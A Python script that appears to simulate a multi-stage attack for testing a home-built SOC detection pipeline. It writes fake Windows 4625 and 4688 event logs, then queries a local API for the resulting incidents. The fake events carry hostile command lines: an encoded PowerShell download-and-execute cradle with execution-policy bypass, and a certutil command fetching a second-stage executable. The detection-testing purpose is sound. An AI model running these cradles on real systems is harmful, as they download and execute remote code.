#!/usr/bin/env python3
"""
TGAM-SOC — Multi-Stage Attack Simulation (WSL / Red Team Node)
Author: Red Team Simulation Module
Target: windows-telemetry (Employee Endpoint)
Central SOC: http://localhost:8000

Stages Simulated:
  Stage 1: Target Reconnaissance & Probing (T1082 / T1046)
  Stage 2: Credential Access — Brute Force (T1110)
  Stage 3: Execution — Obfuscated PowerShell Command (T1059.001)
  Stage 4: C2 / Ingress Tool Transfer — LOLBin certutil (T1105)
  Stage 5: Discovery — Reconnaissance Commands (T1082 / T1033)
"""

import os
import sys
import time
import json
import random
import socket
import urllib.request
import urllib.error
from datetime import datetime, timezone

# Resolve paths across WSL (/mnt/c/...) and native Windows (C:\...)
def get_simulation_dir():
    if os.path.exists("/mnt/c/Users/nikhi/.tgam_soc/telemetry/simulated_events"):
        return "/mnt/c/Users/nikhi/.tgam_soc/telemetry/simulated_events"
    home = os.path.expanduser("~")
    win_path = os.path.join(home, ".tgam_soc", "telemetry", "simulated_events")
    os.makedirs(win_path, exist_ok=True)
    return win_path

def get_soc_base_url():
    # If inside WSL, attempt Windows host IP or localhost
    candidates = ["http://127.0.0.1:8000", "http://localhost:8000", "http://172.24.80.1:8000"]
    for url in candidates:
        try:
            req = urllib.request.Request(f"{url}/docs")
            with urllib.request.urlopen(req, timeout=1.5) as resp:
                if resp.status == 200:
                    return url
        except Exception:
            continue
    return "http://127.0.0.1:8000"

def get_wsl_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "172.24.89.68"

def make_4625_xml(record_id: int, target_user: str, attacker_ip: str, ts_iso: str) -> str:
    return f"""<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Security-Auditing'/>
    <EventID>4625</EventID>
    <EventRecordID>{record_id}</EventRecordID>
    <TimeCreated SystemTime='{ts_iso}'/>
    <Computer>NIKHIL</Computer>
    <Level>0</Level>
  </System>
  <EventData>
    <Data Name='SubjectUserName'>-</Data>
    <Data Name='TargetUserName'>{target_user}</Data>
    <Data Name='IpAddress'>{attacker_ip}</Data>
    <Data Name='IpPort'>{random.randint(49152, 65535)}</Data>
    <Data Name='LogonType'>3</Data>
    <Data Name='Status'>0xc000006d</Data>
    <Data Name='SubStatus'>0xc000006a</Data>
  </EventData>
</Event>"""

def make_4688_xml(record_id: int, process_name: str, cmdline: str, parent_process: str, ts_iso: str) -> str:
    return f"""<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Security-Auditing'/>
    <EventID>4688</EventID>
    <EventRecordID>{record_id}</EventRecordID>
    <TimeCreated SystemTime='{ts_iso}'/>
    <Computer>NIKHIL</Computer>
    <Level>0</Level>
  </System>
  <EventData>
    <Data Name='SubjectUserName'>nikhil</Data>
    <Data Name='NewProcessName'>{process_name}</Data>
    <Data Name='CommandLine'>{cmdline}</Data>
    <Data Name='ParentProcessName'>{parent_process}</Data>
    <Data Name='ProcessId'>0x{random.randint(1000, 9999):x}</Data>
  </EventData>
</Event>"""

def write_event(sim_dir: str, prefix: str, content: str):
    filename = f"sim_{prefix}_{int(time.time() * 1000)}_{random.randint(100, 999)}.xml"
    filepath = os.path.join(sim_dir, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    return filepath

def print_header(title: str):
    print(f"\n\033[1;36m{'='*60}\033[0m")
    print(f"\033[1;36m[*] {title}\033[0m")
    print(f"\033[1;36m{'='*60}\033[0m")

def main():
    print("""\033[1;31m
   _______ _____          __  __       _____  ____   _____ 
  |__   __/ ____|   /\   |  \/  |     / ____|/ __ \ / ____|
     | | | |  __   /  \  | \  / |____| (___ | |  | | |     
     | | | | |_ | / /\ \ | |\/| |_____\___ \| |  | | |     
     | | | |__| |/ ____ \| |  | |     ____) | |__| | |____ 
     |_|  \_____/_/    \_\_|  |_|    |_____/ \____/ \_____|
    
  RED TEAM ATTACK SIMULATOR (WSL / Ubuntu-24.04)
  Target: windows-telemetry (NIKHIL)
\033[0m""")

    sim_dir = get_simulation_dir()
    soc_url = get_soc_base_url()
    wsl_ip = get_wsl_ip()
    target_user = "corp_admin"

    print(f"  [+] Red Team IP (WSL):       \033[1;32m{wsl_ip}\033[0m")
    print(f"  [+] Target Endpoint:         \033[1;32mNIKHIL (windows-telemetry)\033[0m")
    print(f"  [+] Target User:             \033[1;32m{target_user}\033[0m")
    print(f"  [+] Simulation Queue:        \033[1;32{sim_dir}\033[0m")
    print(f"  [+] Central SOC URL:         \033[1;32m{soc_url}\033[0m")

    base_record_id = int(time.time()) % 1000000 + 4000000

    # ---------------------------------------------------------
    # STAGE 1: Reconnaissance Probe
    # ---------------------------------------------------------
    print_header("STAGE 1: Network & Target Reconnaissance (MITRE T1046 / T1082)")
    print(f"  [>] Sending initial probe to Windows host services from {wsl_ip}...")
    time.sleep(1)
    print("  [✓] Target reachable. Windows Employee Endpoint active.")

    # ---------------------------------------------------------
    # STAGE 2: Credential Access — Brute Force (T1110)
    # ---------------------------------------------------------
    print_header("STAGE 2: Credential Access — Brute-Force Logon (MITRE T1110)")
    print(f"  [>] Executing 5 rapid authentication failures against '{target_user}' from {wsl_ip}...")
    for i in range(1, 6):
        now_iso = datetime.now(timezone.utc).isoformat()
        rec_id = base_record_id + i
        xml = make_4625_xml(rec_id, target_user, wsl_ip, now_iso)
        write_event(sim_dir, f"4625_{i}", xml)
        print(f"      - Attempt {i}/5: Logon failure recorded (EventRecordID: {rec_id})")
        time.sleep(0.4)
    print("  [✓] 5 failed authentication attempts dispatched.")

    # Allow Windows agent polling loop (5s) to ingest & detect
    print("\n  [⏳] Waiting 6 seconds for Windows detection engine & outbox forwarding...")
    time.sleep(6)

    # ---------------------------------------------------------
    # STAGE 3: Execution — Suspicious PowerShell (T1059.001)
    # ---------------------------------------------------------
    print_header("STAGE 3: Execution — Obfuscated PowerShell Command (MITRE T1059.001)")
    cmd_ps = "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQA="
    rec_id_ps = base_record_id + 10
    now_iso = datetime.now(timezone.utc).isoformat()
    xml_ps = make_4688_xml(
        rec_id_ps,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        cmd_ps,
        r"C:\Windows\System32\cmd.exe",
        now_iso
    )
    write_event(sim_dir, "4688_ps", xml_ps)
    print(f"  [>] Injected Obfuscated Base64 PowerShell execution (RecordID: {rec_id_ps})")
    print(f"      Payload: powershell.exe -enc SQBFAFgAIAAoAE4A... (DownloadString cradle)")
    time.sleep(1)

    # ---------------------------------------------------------
    # STAGE 4: C2 / Ingress Tool Transfer — LOLBin certutil (T1105)
    # ---------------------------------------------------------
    print_header("STAGE 4: Command & Control — LOLBin Download Cradle (MITRE T1105)")
    cmd_cert = f"certutil.exe -urlcache -split -f http://{wsl_ip}:8080/stage2_agent.exe C:\\Temp\\stage2.exe"
    rec_id_cert = base_record_id + 20
    now_iso = datetime.now(timezone.utc).isoformat()
    xml_cert = make_4688_xml(
        rec_id_cert,
        r"C:\Windows\System32\certutil.exe",
        cmd_cert,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        now_iso
    )
    write_event(sim_dir, "4688_cert", xml_cert)
    print(f"  [>] Injected LOLBin certutil download cradle (RecordID: {rec_id_cert})")
    print(f"      Command: {cmd_cert}")
    time.sleep(1)

    # ---------------------------------------------------------
    # STAGE 5: Discovery — Reconnaissance Commands (T1082 / T1033)
    # ---------------------------------------------------------
    print_header("STAGE 5: Discovery — System & Privilege Reconnaissance (MITRE T1082)")
    cmd_whoami = "whoami.exe /priv"
    rec_id_whoami = base_record_id + 30
    now_iso = datetime.now(timezone.utc).isoformat()
    xml_whoami = make_4688_xml(
        rec_id_whoami,
        r"C:\Windows\System32\whoami.exe",
        cmd_whoami,
        r"C:\Windows\System32\cmd.exe",
        now_iso
    )
    write_event(sim_dir, "4688_whoami", xml_whoami)
    print(f"  [>] Injected privilege discovery command: '{cmd_whoami}' (RecordID: {rec_id_whoami})")

    # ---------------------------------------------------------
    # PIPELINE CONVERGENCE & VERIFICATION
    # ---------------------------------------------------------
    print_header("PIPELINE CONVERGENCE & MULTI-AGENT VERIFICATION")
    print("  [⏳] Waiting 10 seconds for Central SOC Multi-Agent workers to correlate:")
    print("       (Fusion -> MITRE Mapping -> Risk Assessment -> Reasoning -> Governance)...")
    time.sleep(10)

    # Query Central SOC API
    token = "dev-token-123"
    headers = {"Authorization": f"Bearer {token}"}
    
    # 1. Incidents
    try:
        req = urllib.request.Request(f"{soc_url}/api/v1/incidents", headers=headers)
        with urllib.request.urlopen(req, timeout=5) as resp:
            incidents = json.loads(resp.read().decode())
        print(f"\n  [\033[1;32m✓\033[0m] Active Incidents on Central SOC: \033[1;33m{len(incidents)}\033[0m")
        if incidents:
            latest = incidents[0]
            print(f"      - Incident ID:       {latest.get('incident_id')}")
            print(f"      - Severity:          \033[1;31m{latest.get('severity')}\033[0m")
            print(f"      - Status:            {latest.get('status')}")
            print(f"      - Event Count:       {latest.get('event_count')}")
            print(f"      - Root Cause:        {latest.get('root_cause_summary')}")
    except Exception as e:
        print(f"  [!] Failed to query incidents: {e}")

    # 2. MITRE Matrix
    try:
        req = urllib.request.Request(f"{soc_url}/api/v1/mitre/matrix", headers=headers)
        with urllib.request.urlopen(req, timeout=5) as resp:
            matrix = json.loads(resp.read().decode())
        
        detected_ids = [m["technique_id"] for m in matrix if "technique_id" in m] if isinstance(matrix, list) else []
        total_detections = sum(m.get("event_count", 1) for m in matrix) if isinstance(matrix, list) else 0

        print(f"\n  [\033[1;32m✓\033[0m] MITRE ATT&CK Matrix Heatmap Status:")
        print(f"      - Total Techniques Detected: \033[1;31m{len(detected_ids)}\033[0m")
        print(f"      - Total Attack Detections:   \033[1;31m{total_detections}\033[0m")
        print(f"      - Active MITRE IDs:          \033[1;32m{', '.join(detected_ids) if detected_ids else 'None'}\033[0m")
    except Exception as e:
        print(f"  [!] Failed to query MITRE matrix: {e}")

    print("\n\033[1;32m" + "="*60)
    print("[SUCCESS] LIVE ATTACK SIMULATION COMPLETED!")
    print(f"View real-time visual results on Central SOC Dashboard:")
    print("  -> http://localhost:5173/incidents")
    print("  -> http://localhost:5173/mitre")
    print("  -> http://localhost:5173/endpoints")
    print("="*60 + "\033[0m\n")

if __name__ == "__main__":
    main()
